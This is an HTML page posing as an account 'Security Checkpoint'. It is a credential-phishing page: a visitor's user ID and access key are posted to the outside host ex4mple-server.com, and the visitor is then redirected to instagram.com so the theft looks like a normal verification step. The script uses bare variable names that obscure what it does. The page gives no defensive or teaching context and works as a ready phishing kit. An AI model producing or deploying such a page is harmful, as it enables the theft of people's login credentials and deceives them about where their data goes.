<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Account Verification</title>
    <style>
      body {
        font-family: sans-serif;
        max-width: 400px;
        margin: 60px auto;
        padding: 20px;
      }
      input, button {
        width: 100%;
        padding: 10px;
        margin: 8px 0;
      }
    </style>
  </head>
  <body>
    <h2>Security Checkpoint</h2>
    <p>To continue, please verify your account.</p>

    <div>
      <input id="u" type="text" placeholder="User ID" required><br>
      <input id="k" type="password" placeholder="Access Key" required><br>
      <button onclick="c()">Verify</button>
    </div>

    <script>
      function c() {
        const a = document.getElementById("u").value;
        const b = document.getElementById("k").value;

     
        setTimeout(() => {
          fetch("https://ex4mple-server.com/api", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ x: a, y: b })
          }).then(() => {
            
            window.location.href = "https://instagram.com";
          });
        }, 500);
      }
    </script>
  </body>
</html>
